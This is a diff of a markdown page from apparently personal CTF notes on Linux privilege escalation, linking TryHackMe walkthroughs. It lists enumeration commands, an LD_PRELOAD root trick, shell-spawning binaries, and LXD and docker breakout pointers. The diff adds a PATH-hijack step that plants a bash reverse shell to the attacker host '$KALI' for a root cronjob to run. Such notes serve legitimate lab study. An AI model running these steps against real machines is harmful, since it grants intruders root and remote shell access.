@@ -1,7 +1,5 @@
 # Linux
 
-
-
 ## **Gathering Info**
 
 ```
@@ -25,14 +23,18 @@ env
 
 ### Crontab
 
+**Victim**
+
 ```
 cat /etc/crontab
 ```
 
 Possible other places crons are running
 
+**Victim**
+
 ```
-cat /etc/cron.d/
+cat /etc/cron.d/*
 ```
 
 ## Sudo/SUID/Capabilities <a href="#user-content-sudosuidcapabilities" id="user-content-sudosuidcapabilities"></a>
@@ -41,19 +43,35 @@ Run all of these commands then check [https://gtfobins.github.io/](https://gtfob
 
 ### **Check what can be run with NOPASSWD**
 
+**Victim**
+
 ```
 sudo -l
 ```
 
-#### **LD\_PRELOAD**
+
+
+| Finding        | Comment | Examples |
+| -------------- | ------- | -------- |
+| fill out later |         |          |
+|                |         |          |
+|                |         |          |
+
+### **LD\_PRELOAD**
+
+**Examples**
+
+[road.md](../../../../walkthroughs/tryhackme/road.md "mention")
 
 If LD\_PRELOAD is set try below then running the script we can run with NOPASSWD
+
+<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
 
 ```
 vi preload.c
 ```
-
-<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **preload.c - code**
 
@@ -69,28 +87,84 @@ void _init() {
 }
 ```
 
-
+**Victim**
 
 ```
 gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
 sudo LD_PRELOAD=/tmp/preload.so $NOPASSWD_SCRIPT_WE_CAN_ABUSE
 ```
 
+
+
 ### **Files with SUID-bit set**
+
+**Victim**
 
 ```
 find / -perm -u=s -type f 2> /dev/null 
 ```
 
-| Finding | Comments                                                                                                                                                          |
-| ------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| setcap  | If setcap is set that is very interesting checkout room [annie.md](../../../../walkthroughs/tryhackme/annie.md "mention") for an example for privilege escalation |
-|         |                                                                                                                                                                   |
-|         |                                                                                                                                                                   |
+| Finding                       | Comments                                                                                                            | Examples                                                                                                                                                                                                                                                                                                     |
+| ----------------------------- | ------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| setcap                        | If setcap is set that is very interesting checkout room. Could lead to priv esc. by setting getcap on other things. | [annie.md](../../../../walkthroughs/tryhackme/annie.md "mention")                                                                                                                                                                                                                                            |
+| Programs in strange locations | If there is a program running in a user home directory or somewhere strange, it may be worth investigating          | <p><a data-mention href="../../../../walkthroughs/tryhackme/common-linux-privesc.md">common-linux-privesc.md</a><a data-mention href="../../../../walkthroughs/tryhackme/madeyes-castle/">madeyes-castle</a> <br><a data-mention href="../../../../walkthroughs/tryhackme/containme.md">containme.md</a></p> |
+| find                          | Can spawn shell                                                                                                     | [boiler-ctf.md](../../../../walkthroughs/tryhackme/boiler-ctf.md "mention")                                                                                                                                                                                                                                  |
+| doas                          | Can read files or copy files                                                                                        | [glitch.md](../../../../walkthroughs/tryhackme/glitch.md "mention")                                                                                                                                                                                                                                          |
+| strings                       | Can read files                                                                                                      | [jack-of-all-trades.md](../../../../walkthroughs/tryhackme/jack-of-all-trades.md "mention")                                                                                                                                                                                                                  |
+| cputils                       | Can copy files                                                                                                      | [olympus.md](../../../../walkthroughs/tryhackme/olympus.md "mention")                                                                                                                                                                                                                                        |
+
+### Getcap
+
+**Victim**
 
 ```
 getcap -r / 2>/dev/null
 ```
+
+| Finding | Comments                                                                                                                                                                                                             | Examples                                                                                                    |
+| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
+| python  | If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID. | [oh-my-webserver.md](../../../../walkthroughs/tryhackme/oh-my-webserver.md "mention")                       |
+| vim     | Can spawn shell                                                                                                                                                                                                      | [linux-privilege-escalation.md](../../../../walkthroughs/tryhackme/linux-privilege-escalation.md "mention") |
+| perl    | Can spawn shell                                                                                                                                                                                                      | [wonderland.md](../../../../walkthroughs/tryhackme/wonderland.md "mention")                                 |
+| openssl | Can spawn shell                                                                                                                                                                                                      | [mindgames.md](../../../../walkthroughs/tryhackme/mindgames.md "mention")                                   |
+
+
+
+## PATH Variables
+
+**Examples**
+
+[hacker-vs.-hacker.md](../../../../walkthroughs/tryhackme/hacker-vs.-hacker.md "mention")
+
+Look at the paths, below is an example of a cronjob. it first looks at /home/lachlan/bin before /bin and /usr/bin. therefore we can change pkill because it doesn't use the exact path in the cronjob. This means we can put a new file called /home/lachlan/bin/pkill with whatever we want and it will run as root.
+
+**Victim**
+
+```
+cat /etc/crontab
+```
+
+Possible other places crons are running
+
+**Victim**
+
+```
+cat /etc/cron.d/*
+```
+
+<figure><img src="../../../../.gitbook/assets/image (774).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(lachlan)**
+
+```
+echo "bash -c 'bash -i >& /dev/tcp/$KALI/1338 0>&1'" > /home/lachlan/bin/pkill ; chmod  +x bin/pkill
+```
+
+
+
+**Kali**
+
+## Writable Files
 
 **Files where group permissions equal to "writable"**
 
@@ -114,7 +188,9 @@ rpm -qa # red hat
 pacman -Qe # arch linux
 ```
 
-**Look at open ports**
+## **Ports**
+
+May be able to find open ports only accessible internally.&#x20;
 
 ```
 ss -ltp
@@ -124,9 +200,13 @@ ss -ltp
 
 ### LXD&#x20;
 
-Followed this link on lxd privilege escalation. Did this on [anonymous.md](../../../../walkthroughs/tryhackme/anonymous.md "mention") and [gamingserver.md](../../../../walkthroughs/tryhackme/gamingserver.md "mention")
+**Examples**
 
-**Link:** [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)
+[anonymous.md](../../../../walkthroughs/tryhackme/anonymous.md "mention")[gamingserver.md](../../../../walkthroughs/tryhackme/gamingserver.md "mention")
+
+**Resources**
+
+[https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)
 
 **Victim**
 
@@ -164,7 +244,9 @@ id
 
 
 
-## PSPY
+## Monitor Processes
+
+### PSPY
 
 script that can monitor linux processes without root access
 
@@ -191,7 +273,7 @@ chmod +x pspy32
 
 {% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation" %}
 
-Look at below rooms of docker breakout
+**Examples**
 
 [ultratech.md](../../../../walkthroughs/tryhackme/ultratech.md "mention")
 
@@ -207,7 +289,7 @@ Copy Material from here:
 
 
 
-**Automated Enumeration Tools**
+## **Automated Enumeration Tools**
 
 | Name                          | Link                                                                                                                                                                                           |
 | ----------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
